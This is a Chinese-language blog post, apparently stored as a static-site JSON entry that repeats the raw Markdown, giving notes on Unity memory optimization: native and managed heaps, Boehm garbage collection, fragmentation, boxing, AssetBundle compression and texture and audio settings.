装箱;装箱是Unity中非常常见的非预期的临时内存分配原因之一。只要将值类型值用作引用类型，就会发生这种情况;C＃的IDE和编译器通常不会发出有关装箱的警告，即使它会导致意外的内存分配。这是因为C＃语言是在假设小型临时分配将由分代垃圾收集器和分配大小敏感的内存池有效处理的情况下开发的。虽然Unity的分配器确实使用不同的内存池进行小型和大型分配，但Unity的垃圾收集器是不是分代的，因此不能有效地扫除由装箱生成的小的，频繁的临时分配。在用Unity运行时编写C＃代码时，应尽可能避免使用装箱操作。装箱的一个常见原因是使用enum类型作为词典的键。要解决这个问题，有必要编写一个实现IEqualityComparer接口的自定义类，并将该类的实例指定为Dictionary的比较器;Unity 5.5中的C＃编译器升级显着提高了Unity生成IL的能力。已经从foreach循环中消除了装箱操作。消除了与foreach循环相关的内存开销。(https://blog.csdn.net/salvare/article/details/79935578)\n> String相关;在C#中，String字符串是引用类型而不是值类型。C#中的字符串是不可变更的，其引用指向的值在创建后是不可被变更的。因此在创建或者丢弃字符串的时候，会造成托管堆内存分配。推荐做法：减少不必要的字符串创建，提前创建并持有缓存;减少不必要的字符串操作，比如常用的+。每次在对字符串进行操作的时候（例如运用字符串的”+”操作），unity会新建一个字符串用来存储相加后的字符串。然后使之前的旧字符串被标记为废弃，成为内存垃圾。改用StringBuilder类 , StringBuilder就是专门设计用来创建字符串而不产生额外托管堆分配的类，而且可以避免字符串拼接产生垃圾\n> 注意由于调用Unity的API所造成的堆内存分配;如果函数需要返回一个数组，则一个新的数组会被创建用作结果返回，简单地缓存一个对数组的引用;函数gameobject.name或gameobject.tag，可以使用一个相关的联合函数。用Input.GetTouch()和Input.touchCount()来代替Input.touches或者用Physics.SphereCastNonAlloc()来代替Physics.SphereCastAll();mesh.vertices 每次调用也是会造成开销的.\n\n* unity的mono堆内存分配后会返还给系统吗？\n> 不会，目前Unity所使用的Mono版本存在一个很严重的问题，Mono的堆内存是只升不降。\n> 新一代版本会返回给系统,IL2CPP 版本的也会返回\n\n\nVM : mono的一个VM内存池,虚拟机的内存池.VM内存会返回内存给OS内存,当一块内存 GC 6次没有被访问到,就会将内存放回给OS\nGC :\n[分代式内存回收](https://www.cnblogs.com/nele/p/5673215.html)\nGC机制考量,\nThroughput(回收能力):一次GC会回收到多少内存\npause times(暂停时长):一次GC对主线程影响多大,会让主线程暂停多少毫秒\nFragmentation(碎片化):一次GC内存回收之后,会让整块内存的碎片化增加多少,即不连续内存会增加多少.\nMutator overhead(额外消耗):回收本身有消耗,需要考量这个消耗有多大.\nSoalability(可扩展性):多核多线程时会不会有其他bug\nPortability(可移植性):在其他平台上面是否可以移植\n\n目前GC:\nunity现在使用的是:Boehm(Non-generational)非分代式,(Non-compaction)非压缩方式,内存回收机制,是所有内存同一放在一起的.造成主线程的卡顿\n\n- 下一代GC:\n    - Incremental GC(渐进式GC),分帧去做GC回收,GC时长还是一样的,但是会避免系统卡顿;目前已转向IL2CPP(升级的Boehm)了.\n\n\n- 问题:内存下降,但是总体的内存池还是上升了,为什么?\n    - 是代码碎片化导致的.因为有一块内存一直插不进去当前内存池里面,只能另行开辟内存.也就是内存碎片化没有被压缩.优化建议,先去对大型内存创建和释放,再对小型内存进行创建和释放.\n    - Zimbie Memory(僵尸内存,别名就叫做脏内存,无用内存) :指内存从开启游戏到游戏关闭只用了一次内存.没有被释放,内存也没有泄露,也没办法使用.内存泄漏指得是没有任何人可以访问和管理到它,也没法释放掉.优化建议:不要觉得 obj == null就是释放掉内存了,显示调用destroy方法才可以释放掉.\n    - 要常用struct不要用class\n    - Pool In Pool (池中池) 高频使用的小部件需要建立一个内存池,不要频繁的去创建销毁Closures and anonymous methods (闭包和匿名函数,协程) 这些东西最终在C++层全部new成一个class了,优化建议:不要用.关于协程的优化建议:用的时候创建,及时销毁.再用时,再创建,再销毁.\n    - 配置表优化,优化建议,采用C++管理内存,使用C#接口以及Lua接口去查询,而不是在c#和Lua里面保存内存,不要在c#和Lua里面重新全部记录.例如:从C++接过配置表对象时,在c#里面再保存一份,这是错误的方式.\n    - Singleton 单例慎用,仅在必要时用,最好不要用单例模板,太坑爹的设计了,难用不说还特么代码难看懂,恶心.\n\n\n#### 第三方库(主要是lua优化)-->\n- 需要查看tolua源码以及C++基础,然后在tolua的基础上面做优化,需要的个人能力比较强.\n以及使用C++库作为插件导入进unity里面使用.\n\n#### unity底层代码优化方向-->\n底层会根据类型将内存分配到不同的Allooator的池子里面,使用GetRuntimeMemory\nprofiler中Memory一项中的Used Total 和 Reserved Total会保持相同的上升或者下降,如果不一致,那就是出bug了.\nUsed Total 表示当前你使用了多少内存\nReserved Total表示unity申请了多少内存,将要使用到的内存\n1: Scene中的GameObject太多,则内存会暴涨.如果在场景中创建了一个GameObject,底层C++会创建一个或者多个object(记录component),去记录这个GameObject的信息.是程序的优化重点,建议:尽量少创建GameObject,并且无用GameObject尽量干掉,优化GameObject个数.\n2: Audio中会有个缓存池(DSP buffer),需要用户设置,填充满就会向CPU发送播放指令,发送完播放指令才会播放.设置的过大,则音频填充满就会时间过长,声音延迟,设置的过小,就会向CPU频繁发送.优化建议:测试音频播放密集时与不密集时的样本,并进行大小变换设置.\nForce to mono,双声道音频设置,双声道概念:左右声道播放的不一致的声音.优化建议,设置为单声道.\n音频格式Format,Mac/iOS上面的音频设置为mp3,有硬件支持.\n音频压缩格式Compression Format:在哪种情况下使用哪种形态,需要去unity官方手册上面查询.\n3: CodeSize,模板泛型的乱用,会导致打包速度,并且静态代码量增多.模板泛型,(il2cpp)会在C++层将泛型全部转成静态类型的C++,会变的很大.(一个文件2-3m已经很多了吧,官方视频上说有25M!  ...)\n4: AssetBundle \ntypetree,序列化的时候会生成一个typetree,反序列化的时候会根据这个typetree反序列化.\n关闭typetree内存会减小,包大小会减小,build和运行时会变快.\nLz4 压缩方式,快速压缩,包体大Lzma上面30%,不要用Lzma,lzma会增大内存等等副作用.\nasset会有头记录部分,以及实际的数据部分,如果每一个都打成ab则有可能发生,头记录部分比实际数据部分还要大,建议是1-2M,5G以后可以加大.\n5:Resource 文件夹 ,打进包的时候会做一个红黑树(R-B Tree),会检索数据在什么位置,这个里面的数据很大,则红黑树就会很大.优化建议:不要放大量数据就行了,用ab替换.\n6:Texture\nupload buffer 这个数据表示填满之后向GPU发送一次,建议测试并平均该值\nR/W read and write 一般情况下不要开,开启情况会在显存和内存中各一份.\nmip maps UI情况下不要开就行了.\n7: mesh   \nR/W 一般情况下不要开. compression在某些unity版本上面开了比不开占用更多内存.\n\n\n###### tips:[加快Unity编辑器下脚本编译速度](https://www.xuanyusong.com/archives/4474)\n\n\n创建与加载monobehavier以后，内存中有大量这种东西，内存中是没有做过优化的，内存结构不合理，不够紧凑，分散点比较多，cpu也没有将这些事情并行处理，monobehavier里面的方法还是有反射到c++层使用的\n\n***\n\n# C#与非托管DLL进行交互\nhttps://blog.csdn.net/salvare/article/details/80087488\n\n# Unity内存管理的核心问题\n\n* 1:内存使用是否合适? 内存块大小,碎片化.\n* 2:内存泄露如何解决? 僵尸内存\n* 3:Reserved Total 内存总量尽量小于80M\n* 4:纹理资源内存尽量小于 50M,\n* 5:网格资源内存尽量小于 20M,模型的 Tangents 尽量选择 None\n* 6:RenderTexture 内存峰值,需要控制分辨率,需要关注 Antialiasing(反锯齿)\n* 7:ParticleSystem 粒子系统总体使用数量\n* 8:AssetBundle资源冗余,如何做到零冗余-->https://blog.uwa4d.com/archives/1577.html\n* 9:AssetBundle(SerializedFile)尽量小于 50 个\n* 10:关注一次性分配过多内存,关注哪个函数在分配内存.配表解析,New Class,String 操作,Instantiate,格式转换\n* 11:内存泄露,每1000 帧需要获取一下堆内存和变量数.","source":"_posts/Unity/Optimize/Unity内存优化.md","raw":"---\ntitle: Unity 内存优化\ndate: 2020-05-08 11:41:32\ntop: 10\ncategories:\n- Unity优化\ntags:\n- Unity优化\n---\n\n\n\n# 参考资料\nhttps://docs.unity.cn/cn/current/Manual/BestPracticeGuides.html\nhttps://www.bilibili.com/video/BV1aJ411t7N6\nhttps://zhuanlan.zhihu.com/p/61105374\n\n# GC\n* 1:[GC优化](https://mp.weixin.qq.com/s/ARNJtujrHKgxBWuanO0tpA)\n\n# 内存分类\nUnity 3D中的内存管理 http://onevcat.com/2012/11/memory-in-unity3d/\n\n# 资源内存\nhttps://www.cnblogs.com/88999660/archive/2013/03/15/2961663.html\n\n\n# 概念理解\n\n#### 内存\n* 物理内存:CPU 访问内存是一个慢速过程,减少Cache Miss,ECS 和 DOTS\n* 虚拟内存:内存交换,移动设备不支持内存交换,iOS 可以进行内存压缩,Android 没有内存压缩能力\n* 内存杀手 low memory killer(AKA lmk),内存不足时，killer 会出现，从上图底层一层一层地向上杀。（Cached-Previous-Home...）\n![内存杀手](内存杀手.png)\n\n#### Unity 内存管理\n\n- Unity 是一个 C++ 引擎\n    - 底层代码完全由 C++ 写成\n    - 通过 Wrapper 提供给用户 API ; .binding 链接 C#与 C++的语言,目前逐渐转成 C#\n    - 用户代码会转换为 CPP 代码 （il2cpp）\n        - VM 仍然存在（il2cpp vm）,主要是为了跨平台\n    - Editor ,package,都是用 C#写的\n- Unity 内存按照分配方式分为：\n    - Native Memory\n    - Managed Memory\n    - Editor & Runtime 是完全不同的\n        - 不止是统计看到的内存大小不同，甚至是内存分配时机和方式也不同\n        - Asset 在 Runtime 中如果不读取，是不会进内存的，但 Editor 打开就占内存。因为 Editor 不注重 Runtime 的表现，更注重编辑器中编辑时的流畅。\n            - 但如果游戏庞大到几十个 G，如果第一次打开项目，会消耗很多时间，有的大的会几天，甚至到一周。\n- Unity 内存按照管理者分为：\n    - 引擎管理内存\n    - 用户管理内存（应优先考虑）\n- Unity 检测不到的内存\n    - 用户分配的 native 内存\n        - 自己写的 Native 插件（C++ 插件）， Unity 无法分析已经编译过的 C++ 是如何去分配和使用内存的。\n        - Lua 完全由自己管理内存，Unity 无法统计到内部的使用情况。\n\n#### Unity 游戏应用的4种内存类型\n* 1: Unity底层(C++层,本机堆,核心代码,unityengine.dll等一系列别称)占用的内存,包含Scene,Audio,CodeSize,贴图等.Unity使用了自己的一套内存管理机制来使这块内存具有和托管堆类似的功能。基本理念是，如果在这个关卡里需要某个资源，那么在需要时就加载，之后在没有任何引用时进行卸载。听起来很美好也和托管堆一样，但是由于Unity有一套自动加载和卸载资源的机制，让两者变得差别很大。自动加载资源可以为开发者省不少事儿，但是同时也意味着开发者失去了手动管理所有加载资源的权力，这非常容易导致大量的内存占用（贴图什么的你懂的），也是Unity给人留下“吃内存”印象的罪魁祸首。       \n\n* 2: Unity的托管堆（Managed Heap）,托管内存,也被称为用户管理的内存,[Mono](http://www.mono-project.com/Main_Page)项目一个开源的.net框架的一种实现，对于Unity开发，其实充当了基本类库的角色。托管堆用来存放类的实例（比如用new生成的列表，实例中的各种声明的变量等）。“托管”的意思是Mono“应该”自动地改变堆的大小来适应你所需要的内存，并且定时地使用垃圾回收（Garbage Collect）来释放已经不需要的内存。关键在于，有时候你会忘记清除对已经不需要再使用的内存的引用，从而导致Mono认为这块内存一直有用，而无法回收。profile可以检测到.并且需要手机查找才正常,经常需要优化的部分.\n\n* 3: 代码文件的内存.如lua脚本本身的内存.C#泛型类的内存,C++层会将泛型编译成静态类型就多出很多文件,尽量注意不要使用太多泛型模板类,shader写的一个,但是编译成很多份的文件等,都是代码文件会占用的内存.\n程序代码包括了所有的Unity引擎，使用的库，以及你所写的所有的游戏代码。在编译后，得到的运行文件将会被加载到设备中执行，并占用一定内存。这部分内存实际上是没有办法去“管理”的，它们将在内存中从一开始到最后一直存在。一个空的Unity默认场景，什么代码都不放，在iOS设备上占用内存应该在17MB左右，而加上一些自己的代码很容易就飙到20MB左右。想要减少这部分内存的使用，能做的就是减少使用的库。 \n\n* 4: 第三方库的占用的内存,也被称为用户管理的内存,但是已经和unity的内存关系上完全无关了,如自己使用C++编译的库,tolua占用的内存,lua文件占用的内存(这个不是unity管理的),lua占用的内存. 并且unity编辑器的profile无法检测到.\n\n# Unity Native Memory 管理以及优化\n- Unity 重载了所有分配内存的操作符（C++ alloc、new），使用这些重载的时候，会需要一个额外的 memory label （Profiler-shaderlab-object-memory-detail-snapshot，里面的名字就是 label：指当前内存要分配到哪一个类型池里面）\n- 使用重载过的分配符去分配内存时，Allocator 会根据你的 memory label 分配到不同 Allocator 池里面，每个 Allocator 池 单独做自己的跟踪。因此当我们去 Runtime get memory label 下面的池时就可以问 Allocator，里面有多少东西 多少兆。\n- Allocator 在 NewAsRoot 中生成,生成了一个 memory island(root)。在这个 memory island(root) 下面会有很多子内存：shader：当我们加载一个 Shader 进内存的时候，会生成一个 Shader 的 root。Shader 底下有很多数据：sub shader、Pass 等会作为 memory (root) 的成员去依次分配。因此当我们最后统计 Runtime 的时候，我们会统计 Root，而不会统计成员，因为太多了没法统计。\n- 因为是 C++ 的，因此当我们 delete、free 一个内存的时候会立刻返回内存给系统，与托管内存堆不一样。\n\n- Scene\n    - Unity 是一个 C++ 引擎，所有实体最终都会反映在 C++ 上，而不是托管堆里面。因此当我们实例化一个 GameObject 的时候，在 Unity 底层会构建一个或多个 Object 来存储这个 GameObject 的信息，例如很多 Components。因此当 Scene 有过多 GameObject 的时候，Native 内存就会显著上升。\n    - 当我们看 Profiler，发现 Native 内存大量上升的时候，应先去检查 Scene。\n- Audio\n    - DSP buffer （声音的缓冲）\n        - 当一个声音要播放的时候，它需要向 CPU 去发送指令——我要播放声音。但如果声音的数据量非常小，就会造成频繁地向 CPU 发送指令，会造成 I\\O。\n        - 当 Unity 用到 FMOD 声音引擎时（Unity 底层也用到 FMOD），会有一个 Buffer，当 Buffer 填充满了，才会向 CPU 发送 \"我要播放声音\" 的指令。\n        - DSP buffer 会导致两种问题：\n            - 如果（设置的） buffer 过大，会导致声音的延迟。要填充满 buffer 是要很多声音数据的，但声音数据又没这么大，因此会导致一定的**声音延迟**。\n            - 如果 DSP buffer 太小，会导致 CPU 负担上升，满了就发，消耗增加。\n\n            [Audio](https://docs.unity3d.com/Manual/class-AudioManager.html)\n\n    - Force to mono\n        - 在导入声音的时候有一个设置，很多音效师为了声音质量，会把声音设为双声道。但 95% 的声音，左右声道放的是完全一样的数据。这导致了 1M 的声音会变成 2M，体现在包体里和内存里。因此一般对于声音不是很敏感的游戏，会建议改成 Force to mono，强制单声道。\n    - Format\n    - Compression Format（看文档，有使用建议）\n- Code Size\n    - C++ 模板泛型的滥用,会影响到 Code Size、打包的速度。会翻译成 CPP 文件,如果泛型过多,则会造成 CPP 过大,每一个泛型都会生成一个对应的 class,都会变成静态类型.\n        - 可以参考 [Memory Management in Unity](https://learn.unity.com/tutorial/memory-management-in-unity) 3.IL2CPP & Mono 的 Generic Sharing 部分。\n- AssetBundle\n    - TypeTree\n        - Unity 的每一种类型都有很多数据结构的改变，为了对此做兼容，Unity 会在生成数据类型序列化的时候，顺便会生成 TypeTree：当前我这一个版本里用到了哪些变量，对应的数据类型是什么。在反序列化的时候，会根据 TypeTree 来进行反序列化。\n            - 如果上一个版本的类型在这个版本中没有，TypeTree 就没有它，因此不会碰到它。\n            - 如果要用一个新的类型，但在这个版本中不存在，会用一个默认值来序列化，从而保证了不会在不同的版本序列化中出错，这个就是 TypeTree 的作用。\n        - Build AssetBundle 中有开关可以关掉 TypeTree。当你确认当前 AssetBundle 的使用和 Build Unity 的版本一模一样，这时候可以把 TypeTree 关掉。\n            - 例如如果用同样的 Unity 打出来的 AssetBundle 和 APP，TypeTree 则完全可以关掉。\n        - TypeTree 好处：\n            - 内存减少。TypeTree 本身是数据，也要占内存。\n            - 包大小会减少，因为 TypeTree 会序列化到 AssetBundle 包中，以便读取。\n            - Build 和运行时会变快。源代码中可以看到，因为每一次 Serialize 东西的时候，如果发现需要 Serialize TypeTree，则会 Serialize 两次：\n                - 第一次先把 TypeTree Serialize 出来\n                - 第二次把实际的东西 Serialize 出来\n                - 反序列化也会做同样的事情，1. TypeTree 反序列化，2. 实际的东西反序列化。\n            - 因此如果确定 TypeTree 不会对兼容性造成影响，可以把它关掉。这样对 Size 大小和 Build Runtime 都会获得收益。\n\n    - 压缩方式：\n        - Lz4\n\n            [BuildCompression.LZ4](https://docs.unity3d.com/2019.3/Documentation/ScriptReference/BuildCompression.LZ4.html)\n\n            - LZ4HC \"Chunk Based\" Compression. 非常快\n            - 和 Lzma 相比，平均压缩比率差 30%。也就是说会导致包体大一点，但是（作者说）速度能快 10 倍以上。\n        - Lzma\n\n            [BuildCompression.LZMA](https://docs.unity3d.com/2019.3/Documentation/ScriptReference/BuildCompression.LZMA.html)\n\n            - Lzma 基本上就不要用了，因为解压和读取速度上都会比较慢。\n            - 还会占大量内存\n                - 因为是 Steam based 而不是 Chunk Based 的，因此需要一次全解压\n                - Chunk Based 可以一块一块解压\n                    - 如果发现一个文件在第 5-10 块，那么 LZ4 会依次将 第 5 6 7 8 9 10 块分别解压出来，每次（chunk 的）解压会重用之前的内存，来减少内存的峰值。\n        - 预告：中国版 Unity 会在下个版本（1月5号或2月份）推出新的功能：基于 LZ4 的 AssetBundle 加密，只支持 LZ4。\n        - Size & count\n            - AssetBundle 包打多大是很玄学的问题，但每一个 Asset 打一个 Bundle 这样不太好。\n                - 有一种减图片大小的方式，把 png 的头都提出来。因为头的色板是通用的，而数据不通用。AssetBundle 也一样，一部分是它的头，一部分是实际打包的部分。因此如果每个 Asset 都打 Bundle 会导致 AssetBundle 的头比数据还要大。\n            - 官方的建议是每个 AssetBundle 包大概 1M~2M 左右大小，考虑的是网络带宽。但现在 5G 的时候，可以考虑适当把包体加大。还是要看实际用户的情况。\n\n- Resource 文件夹（**Do not use it**. 除非在 debug 的时候）\n    - Resource 和 AssetBundle 一样，也有头来索引。Resource  在打进包的时候会做一个红黑树，来帮助 Resource 来检索资源在什么位置，\n    - 如果 Resource 非常大，那么红黑树也会非常大。\n    - 红黑树是不可卸载的。在刚开始游戏的时候就会加载进内存中，会持续对游戏造成内存压力。\n    - 会极大拖慢游戏的启动时间。因为红黑树没加载完，游戏不能启动。\n\n- Texture\n    - upload buffer，和声音的很像：填满多大，就向 CPU push 一次。\n    - r/w\n        - Texture 没必要就不要开 read and write。正常 Texture 读进内存，解析完了，放到 upload buffer 里后，内存里的就会 delete 掉。\n        - 但如果检测到你开了 r/w 就不会 delete 了，就会在显存和内存中各一份。\n    - Mip Maps\n        - UI 没必要开，可以省大量内存。\n    - Mesh\n        - r/w\n        - compression\n            - 有些版本 Compression 开了不如不开，内存占用可能更严重，具体需要自己试。\n    - Assets\n        - Assets 的数量实际上和 asset 整个的纹理是有关系的。（？）\n\n        [Memory Management in Unity - Unity Learn](https://learn.unity.com/tutorial/memory-management-in-unity)\n\n#### Unity Managed Memory 优化用户管理内存\n[Understanding the managed heap](https://docs.unity3d.com/Manual/BestPracticeUnderstandingPerformanceInUnity4-1.html)\n\n- VM 内存池\n    - mono 虚拟机的内存池\n    - VM 会返还内存给 OS 吗？\n        - **会**\n    - 返还条件是什么？\n        - GC 不会把内存返还给系统\n        - 内存也是以 Block 来管理的。当一个 Block 连续六次 GC 没有被访问到，这块内存才会被返还到系统。（mono runtime 基本看不到，IL2cpp runtime 可能会看到多一点）\n    - 不会频繁地分配内存，而是一次分配一大块。\n- GC 机制（BOEHM Non-generational 不分代的）\n    - GC 机制考量\n        - Throughput(（回收能力）\n            - 一次回收，会回收多少内存\n        - Pause times（暂停时长）\n            - 进行回收的时候，对主线程的影响有多大\n        - Fragmentation（碎片化）\n            - 回收内存后，会对整体回收内存池的贡献有多少\n        - Mutator overhead（额外消耗）\n            - 回收本身有 overhead，要做很多统计、标记的工作\n        - Scalability（可扩展性）\n            - 扩展到多核、多线程会不会有 bug\n        - Protability（可移植性）\n            - 不同平台是否可以使用\n    - BOEHM\n        - Non-generational（不分代的）\n\n            ![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8934bc1f-3e98-4544-b6de-6ea5b80e2850/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8934bc1f-3e98-4544-b6de-6ea5b80e2850/Untitled.png)\n\n            - 分代是指：大块内存、小内存、超小内存是分在不同内存区域来进行管理的。还有长久内存，当有一个内存很久没动的时候会移到长久内存区域中，从而省出内存给更频繁分配的内存。\n            - “非代数”是不分代的,指必须扫描整个托管堆，因此在执行收集传递时必须扫描整个堆，因此其性能因堆的大小扩展而降低。\n        - Non-compacting（非压缩式）\n\n            ![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/33a4002e-f37e-4405-b9b3-815c0f43caba/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/33a4002e-f37e-4405-b9b3-815c0f43caba/Untitled.png)\n\n            - 当有内存被回收的时候，压缩内存会把上图空的地方重新排布。是指当释放的内存产生的间隙不会消失。也就是说对象被销毁，内存被释放，这块内存不会马上收集成为空闲内存的一部分，这块内存只能用来存储比释放对象相同或更小的数据，如果内存间隔太小，会产生内存碎片.即使可能有足够的总空间来容纳某个分配，托管堆也无法找到足够大的连续内存块来适合分配。\n            - 但 Unity 的 BOEHM 不会！它是非压缩式的。空着就空着，下次要用了再填进去。\n                - 历史原因：Unity 和 Mono 合作上，Mono 并不是一直开源免费的，因此 Unity 选择不升级 Mono，与实际 Mono 版本有差距。\n                - 下一代 GC\n                    - Incremental GC（渐进式 GC）\n                        - 现在如果我们要进行一次 GC，主线程被迫要停下来，遍历所有 GC Memory “island”（没听清），来决定哪些 GC 可以回收。\n                        - Incremental GC 把暂停主线程的事分帧做了。一点一点分析，主线程不会有峰值。总体 GC 时间不变，但会改善 GC 对主线程的卡顿影响。\n                    - SGen 或者升级 Boehm？\n                        - SGen 是分代的，能避免内存碎片化问题，调动策略，速度较快\n                    - IL2CPP\n                        - 现在 IL2CPP 的 GC 机制是 Unity 自己重新写的，是升级版的 Boehm\n    - Memory fragmentation 内存碎片化\n\n        ![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/96caa361-8d1a-4f8e-a0b6-87d521bb7f14/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/96caa361-8d1a-4f8e-a0b6-87d521bb7f14/Untitled.png)\n\n        - 为什么内存下降了，但总体内存池还是上升了？\n            - 因为内存太大了，内存池没地方放它，虽然有很多内存可用。（内存已被严重碎片化）\n        - 当开发者大量加载小内存，使用释放*N，例如配置表、巨大数组，GC 会涨一大截。\n            - 建议先操作大内存，再操作小内存，以保证内存以最大效率被重复利用。\n    - Zombie Memory（僵尸内存）\n        - 内存泄露说法是不对的，内存只是没有任何人能够管理到，但实际上内存没有被泄露，一直在内存池中，被 zombie 掉了，这种叫 Zombie 内存。\n        - 无用内容\n            - Coding 时候或者团队配合的时候有问题，加载了一个东西进来，结果从头到尾只用了一次。\n            - 有些开发者写了队列调度策略，但是策略写的不好，导致一些他觉得会被释放的东西，没有被释放掉。\n            - 找是否有活跃度实际上并不高的内存。\n        - 没有释放\n        - 通过代码管理和性能工具分析\n    - 最佳实践\n        - Don't Null it, but Destroy it（显式用 Destory，别用 Null）\n        - Class VS Struct,尽量用 Struct\n        - Pool In Pool（池中池）\n            - VM 本身有内存池，但建议开发者对高频使用的小部件，自己建一个内存池。例如子弹等,高频使用的小部件。\n        - Closures and anonymous methods（闭包和匿名函数）\n            - 如果看 IL，所有匿名函数和闭包会 new 成一个 class，因此所有变量和要 new 的东西都是要占内存的。这样会导致协程。\n                - 有些开发者会在游戏开始启用一个协程，直到游戏结束才释放，这是错误的。\n                - 只要协程不被释放掉，所有内存都会在内存里,在协程里面的内存,只要协程不被释放,则会一直在内存里面。\n                - 用的时候生产一个协程,不用的时候就释放,这是最好的使用协程的方式\n        - Coroutines（协程）\n            - 可看做闭包和匿名函数的一个特例\n            - 最佳实践：用的时候生产一个，不用的时候 destroy 掉。\n        - Configurations（配置表）\n            - 不要把整个配置表都扔进去，是否能通过啥来切分下配置表\n        - Singleton\n            - 慎用,严格检查使用.\n            - 有些内存从游戏一开始到游戏死掉，一直在内存中。\n\n# 优化重点以及方向\nunity托管内存>第三方库(主要是lua优化)>unity底层优化>代码文件.\n\n#### unity托管内存(用户管理内存)\n\n* c# 一共有几种类型:一共有四类\n> 1 值类型。在C#中，所有从System.ValueType继承的类型.bool;byte;char;decimal;double;enum;float;int;long;sbyte;short;ushort;uint;ulong;struct   \n> 2 引用类型。类、接口、委托、object对象;string;stringBuilder;class;interface;delegate        \n> 3 指针。当我们把对象放到堆内存时，访问该对象，就需要一个指向该对象的引用，也就是指针,我们不需要显式的使用指针，Clr会对引用进行管理;注意区别指针(引用)与引用类型的区别，当我们说类型是引用类型时，指的是它需要通过指针来访问;而指针存储着一个指向内存的地址。        \n> 4 指令。处理指令，比如变量声明、数学运算、跳转等\n\n对比参数|值类型\t| 引用类型|\n-------|------|---|\n内存分配(管理) |\t线程栈 |\t托管堆|\n内存回收|\t直接释放|\t等待 GC (垃圾回收器)回收|\nnew实例|\t返回值本身|\t返回内存地址，如果垃圾回收器第0代内存满时，可能引起垃圾回收|\n变量赋值|\t逐字段复制|\t赋值内存地址|\n类型特点|\t轻量、无额外字段|\t需要额外字段（类型地址指针、同步块索引）|\n常见类型|\t数值类型、枚举类型、struct类型|\tstring、clas类|\n是否支持继承|\t值类型都是密封类型，所以不支持继承|\t单继承|\n接口实现|\t支持|\t支持|\n表现方式|\t未装箱、已装箱|\t总是已装箱\n\n\n* 栈的主要功能是什么？\n> 栈的主要功能是跟踪线程执行时的代码指针的位置，以及被调用和返回的数据,可以把它看做一个线程的状态，每个线程都有自己独立的栈。\n> 当调用函数时，会将函数的参数压入线程栈，在方法内的局部变量也会压入线程栈顶。方法执行结束后， 返回值被返回。C++中也是一样的\n\n* 怎么确定数据分配到了哪个内存区？怎么确定数据分配在栈还是堆上？\n> 值类型和指针总分配在被声明的地方，即他们的分配与声明的位置有关，声明在哪儿就分配在哪儿\n> 非空引用类型对象和所有装箱值类型对象总是分配在堆内存上;严格来说，必须在托管堆上分配所有非 null 引用类型对象和所有装箱值类型对象\n> 栈内存由当前线程管理,堆内存由 GC 管理\n\n* 值类型一定分配在栈上吗？\n> 不是,如果声明在函数的局部变量，就分配到线程栈中；如果声明在一个class类中，就分配在堆内存中\n\n* 垃圾回收是如何工作的？垃圾回收的执行过程是什么样的？\n> 1.当GC开始调用时，挂起所有正在运行的线程\n> 2.检查堆上的每个对象,回收线程会检查内存堆\n> 3.搜索当前对象的所有引用\n> 4.没有被引用的对象都是垃圾，被标记为可删除\n> 5.最后遍历删除被标记为可删除的对象，释放内存\n> 6.最后GC会对剩下的对象进行重定位，同时会更新所有指向这些对象的指针（引用）。这一系列操作在性能消耗方面非常昂贵，所以在编写高性能代码时，要注意栈和堆得内存分配。\n\n* 什么情况会触发垃圾回收？\n> 代码需要在托管堆上分配内存时，但发现可分配的空间不足的情况下会触发GC\n> 手动代码调用触发GC\n> Unity不定期的触发GC\n\n* 内存碎片的现象会造成什么问题？\n> 1:堆内存是一块连续的内存地址，清理其中垃圾之后，就会造成内存碎片。\n> 2:内存间隔太小不够放新的对象\n> 3:一个托管堆虽然总空间量已经很大了，但是在这个空间里的内存间隔找不到连续空间来存储新的对象.\n> 4:如果有内存压缩的 GC 机制,内存碎片就会被清空还给系统,最新版的 Unity 会添加内存压缩的 GC 机制,目前应该在筹备中\n\n* unity什么时候会给堆内存扩容？\n> 如果unity发现托管堆的内存不够分配了，会先进行GC，如果GC之后，发现还是不够分配，就进行托管堆的扩容（扩展），堆扩展的具体数量取决于平台; 但是，大多数Unity平台的大小都是托管堆的两倍。\n> 开始分配-->检查托管堆上是否有足够的可分配内存,有就给变量分配内存;没有就触发 Unity 的 GC(垃圾回收)-->检查托管对上是否有足够的可分配内存-->有就给变量分配内存;没有,Unity 就向操作系统申请新的内存(扩充托管对的大小)-->有就给变量分配内存;没有就干掉后台的其他 APP,在没有就再干掉系统服务等等,在没有就杀掉当前 APP\n\n* 从代码上有哪些写法是可以避免内存碎片产生的？\n> 不要在频繁调用的函数中反复进行堆内存分配,在像Update()和LateUpdate()这种每帧都调用的函数，可以判断值变化了才调用某个会有堆内存分配的函数，或者计时器到了才调用某个函数\n> 清空而不是创建集合,创建新的集合(比如：数组，字典，链表等集合类数据)会导致托管堆上的内存分配 , 如果发现在代码中不止一次地创建新集合，那么我们应该缓存引用到的集合，并使用Clear()清空其内容，而不是重复调用new()\n> 尽可能避免C＃中的闭包。在性能敏感的代码中应该尽可能的减少匿名方法和方法引用的使用，尤其是在基于每帧执行的代码中。匿名方法要求该方法能够访问方法范围之外的变量状态，因此已成为闭包。于是C＃通过生成一个匿名类，可以保留闭包所需的外部范围变量。当执行闭包需要实例化其生成的类的副本，并且所有类都是C＃中的引用类型，所以执行闭包需要在托管堆上分配对象。\n> 装箱;装箱是Unity中非常常见的非预期的临时内存分配原因之一。只要将值类型值用作引用类型，就会发生这种情况;C＃的IDE和编译器通常不会发出有关装箱的警告，即使它会导致意外的内存分配。这是因为C＃语言是在假设小型临时分配将由分代垃圾收集器和分配大小敏感的内存池有效处理的情况下开发的。虽然Unity的分配器确实使用不同的内存池进行小型和大型分配，但Unity的垃圾收集器是不是分代的，因此不能有效地扫除由装箱生成的小的，频繁的临时分配。在用Unity运行时编写C＃代码时，应尽可能避免使用装箱操作。装箱的一个常见原因是使用enum类型作为词典的键。要解决这个问题，有必要编写一个实现IEqualityComparer接口的自定义类，并将该类的实例指定为Dictionary的比较器;Unity 5.5中的C＃编译器升级显着提高了Unity生成IL的能力。已经从foreach循环中消除了装箱操作。消除了与foreach循环相关的内存开销。(https://blog.csdn.net/salvare/article/details/79935578)\n> 